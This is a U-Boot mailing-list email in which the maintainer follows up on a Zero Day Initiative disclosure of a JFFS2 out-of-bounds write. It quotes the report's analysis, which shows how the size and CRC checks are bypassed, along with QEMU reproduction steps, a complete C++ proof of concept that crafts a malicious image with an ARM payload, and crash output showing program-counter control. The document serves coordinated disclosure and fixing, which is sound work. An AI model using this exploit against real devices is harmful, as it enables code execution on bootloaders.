Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6515AD68B2D
	for <u-boot@archiver.kernel.org>; Thu, 14 Nov 2024 14:56:46 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id 99C878960F;
	Thu, 14 Nov 2024 15:56:44 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=pass (p=none dis=none) header.from=konsulko.com
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=pass (1024-bit key; unprotected) header.d=konsulko.com header.i=@konsulko.com header.b="iU6ZdHkl";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id 648D789627; Thu, 14 Nov 2024 15:56:43 +0100 (CET)
Received: from mail-oi1-x232.google.com (mail-oi1-x232.google.com
 [IPv6:2607:f8b0:4864:20::232])
 (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id 7D4AA8960F
 for <u-boot@lists.denx.de>; Thu, 14 Nov 2024 15:56:40 +0100 (CET)
Authentication-Results: phobos.denx.de;
 dmarc=pass (p=none dis=none) header.from=konsulko.com
Authentication-Results: phobos.denx.de;
 spf=pass smtp.mailfrom=trini@konsulko.com
Received: by mail-oi1-x232.google.com with SMTP id
 5614622812f47-3e6010a3bbfso387735b6e.2
 for <u-boot@lists.denx.de>; Thu, 14 Nov 2024 06:56:40 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=konsulko.com; s=google; t=1731596199; x=1732200999; darn=lists.denx.de;
 h=in-reply-to:content-disposition:mime-version:references:message-id
 :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
 bh=1ZXGHjA2by2y6Vp2lVMo3sHvb2LyLAHtCnt8qE1VxEo=;
 b=iU6ZdHklL2we44OdwAnu+uKNooVYuds+hMGTVFEWjnojvkr9ThkOgWJCmWZ0LZH5fd
 x4vZpMSPuKMTzQD0JEZXlfsWSCUjWC5oQ7I+76w+Cd5k4it5oDfzaY+mx2bTDbV0U/ed
 3ettKGrFujqExIU9bqcLJK4TfMqjGV0TJvj20=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20230601; t=1731596199; x=1732200999;
 h=in-reply-to:content-disposition:mime-version:references:message-id
 :subject:cc:to:from:date:x-gm-message-state:from:to:cc:subject:date
 :message-id:reply-to;
 bh=1ZXGHjA2by2y6Vp2lVMo3sHvb2LyLAHtCnt8qE1VxEo=;
 b=Agj/kPQsSOmw1W34gw8G737/LlUg+AALSgv5dNc8O3DwM1k8KopN0Jwb7ejnHcURrB
 k3qFaGYtrHQvo1BdyUmn1GlpXiQ96jnqWYjFKeklbIreG+HySy4bBRcjoHtNrnY6TTK9
 3qkDtgEyGgIkWGOrvVU4dDLRCv9Ttqp7Q+6o6K7B/OO0Cju88OBUHqb5iyJI4+zaO300
 RnIosqhR1si1ZDCeFY2knxUVC30iqVr/0XxDnXduE6u406hpvynCsQ9aMRxYoUuJ1oh5
 bvSSSRL/kNOMBCy8giEKqZUVKjFPNo1pOGQ64+00mSgb85DpDVREjmNCSA2vYgtfcTD4
 L9Vw==
X-Gm-Message-State: AOJu0YyMbjquPL8M66u3ACzdvMuh9BxmSZO/JqtAGC0SQFF/P6bF1gRp
 temd1KFtXxl7VE5RzxifY8I/cuh3RqpThbKZo3gFoUf98OV+gWRRzpjwCe6sS2U=
X-Google-Smtp-Source: AGHT+IG4aDSJwCbvtzZwLHUcEnf/91cVkEXeLUVHhIJ4BATMJ7Lx13e26hYdFSVhPYCnGB5w88830g==
X-Received: by 2002:a05:6808:bd3:b0:3e7:58bb:ab4a with SMTP id
 5614622812f47-3e7b0a6bc96mr7870471b6e.2.1731596199051; 
 Thu, 14 Nov 2024 06:56:39 -0800 (PST)
Received: from bill-the-cat ([145.14.135.248])
 by smtp.gmail.com with ESMTPSA id
 46e09a7af769-71a6eb763fdsm398940a34.71.2024.11.14.06.56.37
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Thu, 14 Nov 2024 06:56:38 -0800 (PST)
Date: Thu, 14 Nov 2024 08:56:36 -0600
From: Tom Rini <trini@konsulko.com>
To: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>,
 Michal Simek <michal.simek@amd.com>
Cc: "u-boot@lists.denx.de" <u-boot@lists.denx.de>
Subject: Re: ZDI-CAN-24679: New Vulnerability Report
Message-ID: <20241114145636.GF3600562@bill-the-cat>
References: <DM5PR0102MB3477A6AC67623306D970177980AC2@DM5PR0102MB3477.prod.exchangelabs.com>
 <BYAPR01MB38307E0A0D8A480B35F122F6805B2@BYAPR01MB3830.prod.exchangelabs.com>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
 protocol="application/pgp-signature"; boundary="BUTkX77henB2lyyG"
Content-Disposition: inline
In-Reply-To: <BYAPR01MB38307E0A0D8A480B35F122F6805B2@BYAPR01MB3830.prod.exchangelabs.com>
X-Clacks-Overhead: GNU Terry Pratchett
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean


--BUTkX77henB2lyyG
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Thu, Nov 14, 2024 at 04:02:29AM +0000, zdi-disclosures@trendmicro.com wr=
ote:

> Hi,
> Do you have any updates to share regarding this vulnerability report?

Michal, microblaze-generic is the most active platform that enables
FS_JFFS2 by default and so vulnerable here. Can you find some resources
to look in to fixing this please? Thanks.

>=20
> Thanks,
> ZDI
>=20
> -----Original Message-----
> From: ZDI Disclosures Mailbox
> Sent: Thursday, July 18, 2024 4:05 PM
> To: 'u-boot@lists.denx.de' <u-boot@lists.denx.de>; 'trini@konsulko.com' <=
trini@konsulko.com>
> Subject: ZDI-CAN-24679: New Vulnerability Report
>=20
> ZDI-CAN-24679: Das U-Boot JFFS2 Image Handling Out-Of-Bounds Write Local =
Privilege Escalation Vulnerability
>=20
> -- CVSS -----------------------------------------
>=20
> 8.2: AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
>=20
> -- ABSTRACT -------------------------------------
>=20
> Trend Micro's Zero Day Initiative has identified a vulnerability affectin=
g the following products:
> Das U-Boot - Das U-Boot
>=20
> -- VULNERABILITY DETAILS ------------------------
> * Version tested: 2024.07-rc4
> * Installer file: N/A
> * Platform tested: QEMU
>=20
> ---
>=20
> ### Analysis
>=20
> Das U-Boot versions from 2002_11_05_0120 to v2024.07-rc4 are vulnerable t=
o an arbitrary code execution attack. This vulnerability exists due to an u=
nchecked memcpy function used when processing a JFFS2 filesystem image. An =
attacker could exploit this by crafting a malicious JFFS2 image that tricks=
 memcpy into overwriting memory at an arbitrary offset with malicious code.=
 This could result in the attacker executing arbitrary code on the system o=
r causing other memory corruption issues.
>=20
> The parsing of JFFS2 filesystem in Das U-Boot is handled by the `jffs2_1p=
ass_read_inode()` function defined in `fs/jffs2/jffs2_1pass.c`. ( https://g=
ithub.com/qemu/u-boot/blob/master/fs/jffs2/jffs2_1pass.c )
>=20
> At line 777 of this file, there is a statement for memory copy:
>=20
> ```
> ldr_memcpy(lDest, src, jNode->dsize);
> ```
>=20
> The first two arguments for memcpy are assigned as:
>=20
> At line 770: `lDest =3D (uchar *) (dest + jNode->offset);` At line 755 an=
d 756: `src =3D ((uchar *)jNode) + sizeof(struct jffs2_raw_inode);`
>=20
> As shown above, the source, destination, and size of the memcpy are contr=
olled by an attacker and its following content, and Das U-boot does not pro=
perly check these arguments.
>=20
> Although Das U-Boot does have some checks on the content of inodes, these=
 checks can be easily bypassed:
>=20
> At line 758, it checks if `JNode->offset > totalSize`, but totalSize is a=
ssigned as totalSize =3D jNode->isize at line 714. Therefore, this check ca=
n be bypassed by setting `JNode->isize` to 0xFFFFFFFF.
>=20
> At lines 763, it also checks the CRC, but this check can be bypassed by s=
etting both `JNode->csize` and `JNode->data_crc` to 0.
>=20
> ### Proof of Concept
>=20
> To prove the concept, we created a small program that generates a special=
ly crafted JFFS2 filesystem image. We then used QEMU to demonstrate the pot=
ential risk of this vulnerability. The Das U-Boot, when reading the special=
ly crafted filesystem image, writes content given by us to a memory locatio=
n specified by us, causing the system to crash. We have tested this in Ubun=
tu 14.04. Follow the following instructions to set up the environment and c=
onduct the PoC test.
>=20
> - Install QEMU for MINI2440:
>=20
> ```
> sudo apt-get install git git-core
> cd ~
> mkdir mini2440_qemu/
> cd mini2440_qemu
> git clone git://repo.or.cz/qemu/mini2440.git qemu cd qemu ./configure --t=
arget-list=3Darm-softmmu --prefix=3D$HOME/workspace/mini2440_qemu/qemu/mini=
2440
> make
> make install
> export PATH=3D$HOME/workspace/mini2440_qemu/qemu/mini2440/bin:$PATH
> git clone https://github.com/WeitaoZhu/mini2440-buildroot.git
> cd mini2440-buildroot
> make mini2440_defconfig
> make menuconfig
> ```
>=20
> - Modify Filesystem images to NAND flash with 512B Page and 16 kB erasesi=
ze
>=20
> ```
> make -j4
> cd ~
> git clone https://github.com/cailiwei/flashimg
> cd flashimg
> ./autogen.sh
> ./configure
> make
> cp ~/workspace/mini2440_qemu/mini2440-buildroot/output/images/u-boot.bin =
~/flashimg
> g++ poc.cpp -o poc
> ./poc
> echo -e "root\t0x4000\t0x00000000">part.txt
> ./flashimg -s 64M -t nand -f nand.bin -p part.txt -w root,test -z 512 qem=
u-system-arm -M mini2440 -serial stdio -mtdblock nand.bin -usbdevice mouse =
```
>=20
> - In QEMU, type the following commands:
>=20
> ```
> fsload
> ls
> go 0x32700000
> ```
>=20
> - The output should look like the following
>=20
> ```
> MINI2440 # fsload
> ### JFFS2 loading 'uImage' to 0x32000000 Scanning JFFS2 FS: . done.
> load: Failed to read inode
> ### JFFS2 LOAD ERROR<0> for uImage!
> MINI2440 # go 0x32700000
> ## Starting application at 0x32700000 ...
> qemu: fatal: Trying to execute code outside RAM or ROM at 0x12345678
>=20
> R00=3D00000001 R01=3D33d5fb70 R02=3D00000041 R03=3D00000006
> R04=3D33d5fb70 R05=3D00000002 R06=3D32700000 R07=3D00000000 R08=3D33d5ffd=
c R09=3D00000001 R10=3D00000000 R11=3D33d5fbfd
> R12=3D00000020 R13=3D33d5fb4c R14=3D33f8c4e8 R15=3D12345678
> PSR=3D600001d3 -ZC- A svc32
> Aborted (core dumped)
> ```
>=20
> Note: R15 is $pc and it has been modified to 0x12345678
>=20
> poc.cpp:
>=20
> ```c
> #include <stdio.h>
> #include <stdlib.h>
> #include <cstdint>
> #include <cstring>
> #include <string.h>
> #include <ctype.h>
> #include <sys/stat.h>
> using namespace std;
> #define JFFS2_MAGIC_BITMASK  0x1985
> #define JFFS2_NODE_ACCURATE  0x2000
> #define JFFS2_FEATURE_INCOMPAT  0xC000
> #define JFFS2_FEATURE_RWCOMPAT_DELETE  0x0000 #define JFFS2_NODETYPE_DIRE=
NT  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURATE | 1) #define JFFS2_NODETY=
PE_INODE  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURATE | 2) #define JFFS2_=
NODETYPE_CLEANMARKER  (JFFS2_FEATURE_RWCOMPAT_DELETE | JFFS2_NODE_ACCURATE =
| 3) enum
>   {
>     DT_UNKNOWN =3D 0,
> # define DT_UNKNOWN     DT_UNKNOWN
>     DT_FIFO =3D 1,
> # define DT_FIFO        DT_FIFO
>     DT_CHR =3D 2,
> # define DT_CHR         DT_CHR
>     DT_DIR =3D 4,
> # define DT_DIR         DT_DIR
>     DT_BLK =3D 6,
> # define DT_BLK         DT_BLK
>     DT_REG =3D 8,
> # define DT_REG         DT_REG
>     DT_LNK =3D 10,
> # define DT_LNK         DT_LNK
>     DT_SOCK =3D 12,
> # define DT_SOCK        DT_SOCK
>     DT_WHT =3D 14
> # define DT_WHT         DT_WHT
>   };
> uint32_t crc32(unsigned char* ptr,uint32_t Size) {
>=20
>   uint32_t crcTable[256],crcTmp1;
>   for (int i=3D0; i<256; i++)
>    {
>     crcTmp1 =3D i;
>     for (int j=3D8; j>0; j--)
>      {
>       if (crcTmp1&1) crcTmp1 =3D (crcTmp1 >> 1) ^ 0xEDB88320L;
>        else crcTmp1 >>=3D 1;
>     }
>=20
>      crcTable[i] =3D crcTmp1;
>    }
>   int32_t crcTmp2=3D 0;
>   while(Size--)
>   {
>     crcTmp2 =3D ((crcTmp2>>8) & 0x00FFFFFF) ^ crcTable[ (crcTmp2^(*ptr)) =
& 0xFF ];
>     ptr++;
>   }
>   return (crcTmp2^0xFFFFFFFF)^0xFFFFFFFF; } struct Jffs2_unknown_node {
>             int16_t magic;
>             int16_t nodetype;
>             int32_t totlen;
>             int32_t hdr_crc;
> };
> struct Jffs2_raw_dirent
> {
>             int16_t magic;
>             int16_t nodetype;
>             int32_t totlen;
>             int32_t hdr_crc;
>             int32_t pino;
>             int32_t version;
>             int32_t ino;
>             int32_t mctime;
>             int8_t nsize;
>             int8_t type;
>             int8_t unused[2];
>             int32_t node_crc;
>             int32_t name_crc;
> };
> struct Jffs2_raw_inode
> {
>             int16_t magic;
>             int16_t nodetype;
>             int32_t totlen;
>             int32_t hdr_crc;
>             int32_t ino;
>             int32_t version;
>             int32_t mode;
>             int16_t uid;
>             int16_t gid;
>             int32_t isize;
>             int32_t atime;
>             int32_t mtime;
>             int32_t ctime;
>             int32_t offset;
>             int32_t csize;
>             int32_t dsize;
>             int8_t compr;
>             int8_t usercompr;
>             int16_t flags;
>             int32_t data_crc;
>             int32_t node_crc;
> };
> int main(void)
> {
>         //PAYLOAD CONFIG
>         char TARGET_FILENAME []=3D "uImage";
>         uint32_t TARGET_OFFSET =3D 0x700000;
>         uint32_t TARGET_LENGTH =3D 0x8;
>         unsigned char PAYLOAD[]=3D "\x04\xf0\x1f\xe5\x78\x56\x34\x12"; //=
ldr $pc,0x12345678
>         //
>         FILE *fp =3D fopen("poc.jffs2","wb");
>         uint16_t padding =3D 0xFFFF;
>         Jffs2_unknown_node node;
>         node.magic =3D JFFS2_MAGIC_BITMASK;
>         node.nodetype =3D JFFS2_NODETYPE_CLEANMARKER;
>         node.totlen =3D sizeof(node);
>         node.hdr_crc =3D crc32((unsigned char*)&node,sizeof(Jffs2_unknown=
_node)-4);
>         fwrite(&node,1,sizeof(node),fp);
>         Jffs2_raw_dirent dirent;
>         dirent.magic =3D JFFS2_MAGIC_BITMASK;
>         dirent.nodetype =3D JFFS2_NODETYPE_DIRENT;
>         dirent.totlen =3D sizeof(dirent)+strlen(TARGET_FILENAME);
>         dirent.hdr_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_unk=
nown_node)-4);
>         dirent.pino =3D 1;
>         dirent.version =3D 0;
>         dirent.ino =3D 2;
>         dirent.mctime =3D 0;
>         dirent.nsize =3D strlen(TARGET_FILENAME);
>         dirent.type =3D DT_REG;
>         dirent.unused[0] =3D 0;
>         dirent.unused[1] =3D 0;
>         dirent.mctime =3D 0;
>         dirent.node_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_ra=
w_dirent)-8);
>         dirent.name_crc =3D crc32((unsigned char*)TARGET_FILENAME,strlen(=
TARGET_FILENAME));
>         fwrite(&dirent,1,sizeof(dirent),fp);
>         fwrite(TARGET_FILENAME,1,strlen(TARGET_FILENAME),fp);
>         fwrite(&padding,1,sizeof(padding),fp);
>         Jffs2_raw_inode inode;
>         inode.magic =3D JFFS2_MAGIC_BITMASK;
>         inode.nodetype =3D JFFS2_NODETYPE_INODE;
>         inode.totlen =3D sizeof(inode)+sizeof(PAYLOAD)-1;
>         inode.hdr_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_unkno=
wn_node)-4);
>         inode.ino =3D 2;
>         inode.version =3D 1;
>         inode.mode =3D 0x81A4;
>         inode.uid =3D 0;
>         inode.gid =3D 0;
>         inode.isize =3D 0xFFFFFFFF; //bypass size limit
>         inode.atime =3D 0;
>         inode.mtime =3D 0;
>         inode.ctime =3D 0;
>         inode.offset =3D TARGET_OFFSET;
>         inode.csize =3D 0; //bypass crc32 check
>         inode.dsize =3D TARGET_LENGTH;
>         inode.compr =3D 0;
>         inode.usercompr =3D 0;
>         inode.flags =3D 0;
>         inode.data_crc =3D 0; //bypass crc32 check
>         inode.node_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_raw_=
inode)-8);
>         fwrite(&inode,1,sizeof(inode),fp);
>         fwrite(&PAYLOAD,1,sizeof(PAYLOAD)-1,fp);
>         fwrite(&padding,1,sizeof(padding),fp);
>         fclose(fp);
>         return 0;
> }
> ```
>=20
>=20
> -- CREDIT ---------------------------------------
> This vulnerability was discovered by:
> Aaron Luo and Spencer Hsieh of VicOne
>=20
> -- FURTHER DETAILS ------------------------------
>=20
> Supporting files:
>=20
>=20
> If supporting files were contained with this report they are provided wit=
hin a password protected ZIP file. The password is the ZDI candidate number=
 in the form: ZDI-CAN-XXXX where XXXX is the ID number.
>=20
> Please confirm receipt of this report. We expect all vendors to remediate=
 ZDI vulnerabilities within 120 days of the reported date. If you are ready=
 to release a patch at any point leading up to the deadline, please coordin=
ate with us so that we may release our advisory detailing the issue. If the=
 120-day deadline is reached and no patch has been made available we will r=
elease a limited public advisory with our own mitigations, so that the publ=
ic can protect themselves in the absence of a patch. Please keep us updated=
 regarding the status of this issue and feel free to contact us at any time:
>=20
> Zero Day Initiative
> zdi-disclosures@trendmicro.com
>=20
> The PGP key used for all ZDI vendor communications is available from:
>=20
>   http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc
>=20
> -- INFORMATION ABOUT THE ZDI -------------------- Established by TippingP=
oint and acquired by Trend Micro, the Zero Day Initiative (ZDI) neither re-=
sells vulnerability details nor exploit code. Instead, upon notifying the a=
ffected product vendor, the ZDI provides its Trend Micro TippingPoint custo=
mers with zero day protection through its intrusion prevention technology. =
Explicit details regarding the specifics of the vulnerability are not expos=
ed to any parties until an official vendor patch is publicly available.
>=20
> Please contact us for further details or refer to:
>=20
>   http://www.zerodayinitiative.com
>=20
> -- DISCLOSURE POLICY ----------------------------
>=20
> Our vulnerability disclosure policy is available online at:
>=20
>   http://www.zerodayinitiative.com/advisories/disclosure_policy/
>=20
> TREND MICRO EMAIL NOTICE
>=20
> The information contained in this email and any attachments is confidenti=
al and may be subject to copyright or other intellectual property protectio=
n. If you are not the intended recipient, you are not authorized to use or =
disclose this information, and we request that you notify us by reply mail =
or telephone and delete the original message from your mail system.
>=20
> For details about what personal information we collect and why, please se=
e our Privacy Notice on our website at: Read privacy policy<http://www.tren=
dmicro.com/privacy>

--=20
Tom

--BUTkX77henB2lyyG
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQGzBAABCgAdFiEEGjx/cOCPqxcHgJu/FHw5/5Y0tywFAmc2D5wACgkQFHw5/5Y0
tyxEFQv/emduQAF9mq5pyda0bhA8NtxMOeJpaKjHeNDmSbwzWAWRnpcoN0NSPqK6
fIJJlCIZwO6R8sKh73Ay34SbhAHngtaL4z1+9iSqWX167rw7DP6uDpFNlj8laFvB
/mR1m8J8IU09VDlVQJO3vU5CbHwXZ7YLp5y66tY0M+8rE2z1TMLy4rrgQi7r4X1k
jKpMFxdpLCwk+6D0KvnqEgKXfjffUt9xPoZ5QNPrdEr4OYNgjwaxwQv1JhriW+2c
C+7SL3k4bQd4k19OjhkDeXv9X1IAc9QXoryNzLpnXUqUShWjYuRgcdleN3ScyUnr
3tJAfGkbjdA2b5Ti74oveRpdtrXJjG3lpkKSyR49a5+xN5H5TcUBGm+Ub0rPfdSe
epsgN2qWRpfQAsy/9WDtWELInpfQhbNBsOeFxqyTCHsS6iIfL7Jc2ranBsfkHx0k
8iale7gOAdEopBP4m2kZljchR/hJD4fKASrqG0GsrwI/kfq1+RKnGMouw7fa3OaI
QT8aWZVk
=55WG
-----END PGP SIGNATURE-----

--BUTkX77henB2lyyG--
